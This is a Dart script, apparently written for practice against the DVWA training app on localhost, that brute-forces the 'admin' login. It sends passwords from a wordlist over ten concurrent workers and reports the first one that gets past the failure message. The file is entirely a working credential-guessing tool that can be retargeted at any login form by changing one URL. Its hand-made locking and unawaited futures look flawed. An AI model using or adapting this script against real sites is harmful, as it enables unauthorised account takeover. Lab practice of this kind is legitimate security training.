import 'dart:convert';
import 'dart:io';
import 'dart:async';
import 'package:http/http.dart' as http;

void main() {
  final username = 'admin';
  final wordlistPath = 'wordlist.txt';
  //Number of Threads
  final numThreads = 10;

  // List<String> passwords = File(wordlistPath).readAsLinesSync();
  List<String> passwords =
      File(wordlistPath).readAsStringSync(encoding: utf8).split('\n');

  int passwordIdx = 0;
  List<Future> futures = [];

  for (int i = 0; i < numThreads; i++) {
    futures.add(Future(() async {
      while (true) {
        String password;
        int idx = -1;

        synchronized(() {
          if (passwordIdx < passwords.length) {
            idx = passwordIdx++;
          }
        });

        if (idx == -1) {
          break;
        }

        password = passwords[idx];
        print('Trying password: $password');

        final response = await http.post(
            Uri.parse('http://localhost/dvwa/vulnerabilities/brute/'),
            body: {'username': username, 'password': password});

        if (response.statusCode == 200) {
          if (response.body.contains('Username and/or password incorrect.')) {
            print('Login failed for username: $username, password: $password');
          } else {
            print('SUCCESS! Username: $username, Password: $password');
            exit(0);
          }
        } else {
          print(
              'Failed to login with username: $username, password: $password');
        }

        // if (response.statusCode == 200) {
        //   print('SUCCESS! Username: $username, Password: $password');
        //   exit(0);
        // }

        // Implement algorithmn

      }
    }));
  }

  Future.wait(futures);
}

void synchronized(action()) => _lock.synchronized(action);

class _Lock {
  bool _locked = false;
  final _queue = <Function>[];

  synchronized(Function action) async {
    if (_locked) {
      await Future(() {}).then((_) => synchronized(action));
      return;
    }
    _locked = true;
    action();
    _locked = false;
    if (_queue.isNotEmpty) {
      final lockAction = _queue.removeAt(0);
      synchronized(lockAction);
    }
  }
}

final _lock = _Lock();
